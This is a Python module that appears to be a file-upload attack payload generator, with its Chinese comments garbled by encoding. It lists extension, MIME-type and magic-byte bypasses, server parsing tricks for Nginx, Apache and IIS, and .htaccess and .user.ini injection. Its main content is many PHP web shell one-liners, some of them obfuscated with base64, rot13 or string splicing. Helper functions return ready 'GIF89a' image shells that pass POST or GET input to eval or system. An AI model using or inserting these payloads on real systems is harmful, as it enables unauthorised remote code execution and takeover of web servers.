"""æä»¶ä¸ä¼ æ»å» Payload çæå¨.

è¦ç:
    - åç¼åç»è¿ (é»åå/ç©ºæ ¼ç¹/NTFSæµ/æªæ­/è¶é¿)
    - Content-Type & æä»¶å¤´ä¼ªé 
    - å¾çé©¬åå®¹ç»è¿ (æ³¨é/ç­æ ç­¾/ç¼ç /æ¼æ¥)
    - æå¡ç«¯è§£ææ¼æ´ (Nginx/Apache/IIS)
    - é«çº§æå·§ (.htaccess/.user.ini/æ¡ä»¶ç«äº/äºæ¬¡æ¸²æ)
"""
from typing import List, Dict


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  åç¼åç»è¿
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

EXT_BYPASS: Dict[str, List[str]] = {
    "é»ååæªè¦çåç¼": [
        "php3", "php4", "php5", "php7", "php8",
        "phtml", "pht", "phps", "phar", "php.",
        "shtml", "phtm", "pgif",
    ],
    "å¤§å°åæ··å": [
        "pHp", "Php", "pHp5", "pHtMl",
        "PhP", "PHP", "pHp.",
    ],
    "å¤åç¼ç»å": [
        "shell.php.jpg", "shell.php.png",
        "shell.php.gif", "shell.php.jpeg",
        "shell.php%00.jpg",
    ],
    "ç©ºæ ¼/ç¹æå·§ (Win)": [
        "shell.php ", "shell.php .",
        "shell.php. .", "shell.php. . .",
        "Windows åç½®ç©ºæ ¼+ç¹ â èªå¨å»é¤",
    ],
    "NTFS æ°æ®æµ (Win)": [
        "shell.php::$DATA",
        "shell.php.jpg::$DATA",
        "shell.php:1.jpg",
    ],
    "è·¯å¾æªæ­": [
        "shell.php%00.jpg", "shell.php\\0.jpg",
        "shell.php/../shell.jpg",
        "PHP < 5.3.4 %00 æªæ­ææ",
    ],
    "è¶é¿åç¼": [
        "shell.php..............................................................jpg",
        "shell.php%00.........................................jpg",
    ],
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  Content-Type & æä»¶å¤´ä¼ªé 
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

MIME_HEADER_FAKE: Dict[str, Dict[str, str]] = {
    "image/jpeg": {
        "Content-Type": "image/jpeg",
        "æä»¶å¤´hex": "FFD8FFE0", "ææ¬å¤´": "Ã¿ÃÃ¿Ã ",
    },
    "image/png": {
        "Content-Type": "image/png",
        "æä»¶å¤´hex": "89504E470D0A1A0A", "ææ¬å¤´": "ÂPNG",
    },
    "image/gif": {
        "Content-Type": "image/gif",
        "æä»¶å¤´hex": "4749463839", "ææ¬å¤´": "GIF89a",
    },
    "image/bmp": {
        "Content-Type": "image/bmp",
        "æä»¶å¤´hex": "424D", "ææ¬å¤´": "BM",
    },
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  å¾çé©¬ â åå®¹ç»è¿
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

CONTENT_BYPASS: Dict[str, List[str]] = {
    "æ³¨éæ··æ·": [
        "<?php /*gif89a*/ eval($_POST[1]); ?>",
        "<?php //GIF89a\\neval($_POST[1]); ?>",
        "GIF89a<?php eval($_POST[1]); ?>",
    ],
    "ç­æ ç­¾åå½¢": [
        "<?=eval($_POST[1]);?>",
        "<?=system($_REQUEST['c']);?>",
        "<% eval(request(1)); %>",
        "<script language='php'>eval($_POST[1]);</script>",
    ],
    "å½æ°ååå½¢": [
        "<?php passthru($_GET[1]); ?>",
        "<?php shell_exec($_POST[1]); ?>",
        "<?php proc_open('/bin/sh', [], $p); ?>",
    ],
    "å­ç¬¦ä¸²æ¼æ¥ç»è¿": [
        "<?php $a='ev'.'al'; $a($_POST[1]); ?>",
        "<?php $b='sys'.'tem'; $b('id'); ?>",
    ],
    "ç¼ç å½æ°ç»è¿": [
        "<?php $a=base64_decode('ZXZhbA=='); $a($_POST[1]); ?>",
        "<?php eval(gzinflate(base64_decode('åç¼©å'))); ?>",
        "<?php eval(str_rot13('riny($_CBFG[1]);')); ?>",
    ],
    "æ å½æ°ä¸å¥è¯": [
        "<?php $_POST['_']($_POST['__']); ?>",
        "<?php ${'_POST'}{'_'}(${'_POST'}{'__'}); ?>",
        "<?php $$a=$_POST['_']; $$b=$_POST['__']; $$a($$b); ?>",
    ],
    "å¾çEXIFèé©¬": [
        "exiftool -Comment='<?=eval($_POST[1]);?>' image.jpg",
        "å° shell åå¥å¾ç EXIF Comment å­æ®µ",
    ],
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  æå¡ç«¯è§£ææ¼æ´
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

PARSE_VULN: Dict[str, List[Dict[str, str]]] = {
    "Nginx è§£æ": [
        {"name": "è·¯å¾è§£æ", "tip": "1.jpg/1.php â å½ PHP æ§è¡", "eg": "ä¸ä¼  1.jpg â è®¿é® /upload/1.jpg/1.php"},
        {"name": "%00 æªæ­", "tip": "1.php%00.jpg", "eg": "ä¸ä¼  shell.php%00.jpg â è§£æä¸º PHP"},
    ],
    "Apache è§£æ": [
        {"name": "å¤åç¼ä»åå¾å", "tip": "1.php.xxx.abc", "eg": "ä¸ä¼  shell.php.xxx â Apache ä»å³å¾å·¦å¹é .php"},
        {"name": ".htaccess è¦ç", "tip": "AddType application/x-httpd-php .jpg", "eg": "ä¸ä¼  .htaccess: AddHandler php5-script .jpg"},
    ],
    "IIS è§£æ": [
        {"name": "åå·è§£æ", "tip": "1.asp;.jpg", "eg": "ä¸ä¼  shell.asp;.jpg â IIS è§£æä¸º asp"},
        {"name": ".cer/.asa", "tip": "ç¹æ®æ©å±å", "eg": "ä¸ä¼  shell.cer â IIS è§£æä¸º asp"},
    ],
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  é«çº§ç»è¿æå·§
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

ADVANCED_BYPASS: Dict[str, List[Dict[str, str]]] = {
    "æ¡ä»¶ç«äº": [
        {"name": "ä¸ä¼ å³è®¿é®", "tip": "ä¸ä¼  PHP â å¨å®å¨æ£æ¥å é¤åæ¢è®¿é®"},
        {"name": "å¹¶åç«äº", "tip": "å¤çº¿ç¨åæ¶ä¸ä¼ +è®¿é®, å©ç¨æ¶é´çªå£"},
    ],
    ".htaccess æ³¨å¥": [
        {"name": "å¨é¨å½ PHP æ§è¡", "tip": "SetHandler application/x-httpd-php"},
        {"name": "æå®åç¼", "tip": "AddType application/x-httpd-php .jpg"},
        {"name": "åå«éç½®æä»¶", "tip": "php_value auto_prepend_file shell.jpg"},
    ],
    ".user.ini æ³¨å¥": [
        {"name": "èªå¨åç½®æä»¶", "tip": "auto_prepend_file=1.jpg", "eg": "ææ PHP è¯·æ±èªå¨åå«ä½ çå¾çé©¬"},
        {"name": "èªå¨åç½®æä»¶", "tip": "auto_append_file=1.jpg"},
    ],
    "äºæ¬¡æ¸²æç»è¿": [
        {"name": "åææ¸²æåä¿ççå­è", "tip": "ä¸ä¼ æ­£å¸¸å¾âä¸è½½âgrep åå§å­èâæ shell å¡å¨ä¸ååºå"},
    ],
    "æä»¶åå« + ä¸ä¼ ": [
        {"name": "lfi åå«ä¸ä¼ æä»¶", "tip": "ä¸ä¼  shell.jpg â LFI: ?file=/uploads/shell.jpg"},
        {"name": "Phar ååºåå + ä¸ä¼ ", "tip": "phar://uploads/test.jpg â è§¦åååºåå"},
    ],
    "SVG XSS": [
        {"name": "ä¸ä¼  SVG è§¦å XSS", "tip": "<svg><script>alert(1)</script></svg>"},
        {"name": "SVG åå«å¤é¨å®ä½", "tip": "SVG XXE è¯»åæä»¶"},
    ],
}


def get_ext_bypass(category: str = "") -> dict:
    if category and category in EXT_BYPASS:
        return {category: EXT_BYPASS[category]}
    return EXT_BYPASS


def get_mime_fake(filetype: str = "") -> dict:
    if filetype and filetype in MIME_HEADER_FAKE:
        return {filetype: MIME_HEADER_FAKE[filetype]}
    return MIME_HEADER_FAKE


def get_content_bypass() -> dict:
    return CONTENT_BYPASS


def get_parse_vuln(server: str = "") -> dict:
    if server and server in PARSE_VULN:
        return {server: PARSE_VULN[server]}
    return PARSE_VULN


def get_advanced_bypass() -> dict:
    return ADVANCED_BYPASS


def generate_htaccess(suffix: str = ".jpg") -> str:
    return f"AddType application/x-httpd-php {suffix}"


def generate_userini(filename: str = "1.jpg") -> str:
    return f"auto_prepend_file={filename}"


def generate_image_shell(shell_type: str = "eval") -> str:
    payloads = {
        "eval": 'GIF89a<?=eval($_POST[1]);?>',
        "system": 'GIF89a<?=system($_GET["c"]);?>',
        "one_liner": 'GIF89a<?php $_POST["_"]($_POST["__"]);?>',
    }
    return payloads.get(shell_type, payloads["eval"])
